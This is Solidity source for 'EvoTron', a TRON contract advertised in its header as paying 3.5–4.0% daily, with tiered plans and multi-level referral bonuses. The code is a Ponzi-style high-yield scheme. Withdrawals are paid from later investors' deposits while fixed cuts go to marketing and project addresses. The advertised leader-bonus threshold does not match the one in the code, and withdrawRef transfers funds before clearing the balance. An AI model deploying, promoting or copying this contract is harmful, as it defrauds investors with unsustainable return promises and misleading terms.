//SourceUnit: Evotron.sol

//BE SMART
//Get 3.5-4.0% per day! on smart contract
//PLAN 1 3.5% DAILY deposit amount 200 - 5000 trx
//PLAN 2 3.7% DAILY deposit amount 5000 - 20000 trx
//PLAN 3 4.0% DAILY deposit amount 20000 - 50000 trx
//Referral program 4% 2% 1%
//Leader bonus 2500 trx for every 100,000 trx investments of your referrals at 1 line

pragma solidity 0.5.12;

contract  EvoTron{
	using SafeMath for uint256;

	uint256 constant public START_TIME = 1609866000;
	uint256[] public REFERRAL_PERCENTS = [40, 20, 10];
	uint256 constant public PROJECT_FEE = 30;
	uint256 constant public MARKETING_FEE = 100;
	uint256 constant public DEPOSIT_FUNDS = 870;
	uint256 constant public LIMIT_INVEST = 100000 trx;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public CONTRACT_BONUS_STEP = 10;
	uint256 constant public REF_BONUS_STEP = 4000 trx;
	uint256 constant public REF_BONUS = 2500 trx;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public backBalance;

	address payable public marketingAddress;
	address payable public projectAddress;

	struct InvestPlan {
        uint256 min_amount;
        uint256 max_amount;
        uint256 percent;
        uint256 reinvest;
		uint256 max_profit;
		uint256 total_invested;
    }
    
    struct Deposit {
        uint256 plan;
        uint256 amount;
        uint256 balance;
		uint256 withdrawn;
        uint256 timestamp;
    }

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256[] fromref;
		uint256 fromref_await;
		uint256 count_bonus;
		address referrer;
	}

    InvestPlan[] public InvestPlans;

	mapping (address => User) internal users;

	event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

	constructor(address payable marketingAddr, address payable projectAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		InvestPlans.push(InvestPlan({min_amount: 200 trx, max_amount: 5000 trx, percent: 35, reinvest: 500, max_profit: 2000, total_invested: 0 trx}));
		InvestPlans.push(InvestPlan({min_amount: 5000 trx, max_amount: 20000 trx, percent: 37, reinvest: 530, max_profit: 2000, total_invested: 1000 trx}));
		InvestPlans.push(InvestPlan({min_amount: 20000 trx, max_amount: 50000 trx, percent: 40, reinvest: 550, max_profit: 2000, total_invested: 5000 trx}));
	}

	function invest(uint256 tariff,address referrer) public payable {
		require(now >= START_TIME);
		require(getUserTotalInvested(msg.sender) + msg.value <= LIMIT_INVEST,"LIMIT INVEST 100000trx");
		require(getUserTotalInvested(msg.sender) >= InvestPlans[tariff].total_invested,"The total investment amount does not meet the terms of the tariff plan");
		require(msg.value >= InvestPlans[tariff].min_amount && msg.value <= InvestPlans[tariff].max_amount,"The amount does not meet the terms of the tariff plan");
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		
		User storage user = users[msg.sender];
		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].fromref[i] = users[upline].fromref[i].add(amount);
					users[upline].fromref_await = users[upline].fromref_await.add(amount);
					if(i == 0){
						if(users[upline].fromref[i].div(REF_BONUS_STEP) >= users[upline].count_bonus.add(1)){
							users[upline].count_bonus = users[upline].count_bonus.add(users[upline].fromref[i].div(REF_BONUS_STEP));
							users[upline].fromref_await = users[upline].fromref_await.add(REF_BONUS);
						}
					}
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.fromref = [0,0,0];
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}
		user.deposits.push(Deposit(tariff, msg.value,msg.value, 0, block.timestamp));
		totalInvested = totalInvested.add(msg.value);
		backBalance = backBalance.add(msg.value.mul(DEPOSIT_FUNDS).div(PERCENTS_DIVIDER));
		emit NewDeposit(msg.sender, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];
		uint256 contractRate = getContractBalanceRate();
		uint256 totalAmount;
		uint256 dividends;
		uint256 reinvest;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER))) {
				if (user.deposits[i].timestamp > user.checkpoint) {
					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].timestamp))
						.div(TIME_STEP);
					reinvest = dividends.mul(InvestPlans[user.deposits[i].plan].reinvest).div(PERCENTS_DIVIDER);
				} else {
					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
					reinvest = dividends.mul(InvestPlans[user.deposits[i].plan].reinvest).div(PERCENTS_DIVIDER);
				}
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)) {
					dividends = (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
				}
				dividends = dividends.sub(reinvest);
				user.deposits[i].balance = user.deposits[i].balance.add(reinvest);
				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
				totalAmount = totalAmount.add(dividends);
			}
		}
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		require(totalAmount > 0, "User has no dividends");
		user.checkpoint = block.timestamp;
		msg.sender.transfer(totalAmount);
		totalWithdrawn = totalWithdrawn.add(totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrawRef() public {
		User storage user = users[msg.sender];
		require(user.fromref_await > 0);
		msg.sender.transfer(user.fromref_await);
		totalWithdrawn = totalWithdrawn.add(user.fromref_await);
		user.fromref_await = 0;
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		uint256 rate = backBalance.div(CONTRACT_BALANCE_STEP);
		return rate;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 contractRate = getContractBalanceRate();
		uint256 totalAmount;
		uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER))) {
				if (user.deposits[i].timestamp > user.checkpoint) {
					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].timestamp))
						.div(TIME_STEP);
				} else {
					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)) {
					dividends = (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
				}
				totalAmount = totalAmount.add(dividends);
			}
		}
		return totalAmount;
	}
	
	function getUserDivedentsPlan(address userAddress, uint256 plan) public view returns(uint256){
	    User storage user = users[userAddress];
		uint256 contractRate = getContractBalanceRate();
		uint256 totalAmount;
		uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
		    if(user.deposits[i].plan == plan){
    			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER))) {
    				if (user.deposits[i].timestamp > user.checkpoint) {
    					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
    						.mul(block.timestamp.sub(user.deposits[i].timestamp))
    						.div(TIME_STEP);
    				} else {
    					dividends = (user.deposits[i].balance.mul(contractRate.add(InvestPlans[user.deposits[i].plan].percent)).div(PERCENTS_DIVIDER))
    						.mul(block.timestamp.sub(user.checkpoint))
    						.div(TIME_STEP);
    				}
    				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)) {
    					dividends = (user.deposits[i].amount.mul(InvestPlans[user.deposits[i].plan].max_profit).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
    				}
    				totalAmount = totalAmount.add(dividends);
    			}
    		}
		}
		return totalAmount;
	}
	
	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserFromref(address userAddress, uint256 level) public view returns(uint256) {
		return users[userAddress].fromref[level];
	}

	function getUserFromrefAwait(address userAddress) public view returns(uint256) {
		return users[userAddress].fromref_await;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256, uint256, uint256, uint256) {
		return (users[userAddress].deposits[index].plan, InvestPlans[users[userAddress].deposits[index].plan].percent, users[userAddress].deposits[index].amount, users[userAddress].deposits[index].balance, users[userAddress].deposits[index].withdrawn, users[userAddress].deposits[index].timestamp);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalInvested(address userAddress) public view returns(uint256) {
		uint256 amount;

		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
		uint256 amount;

		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].withdrawn);
		}
		return amount;
	}
    
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}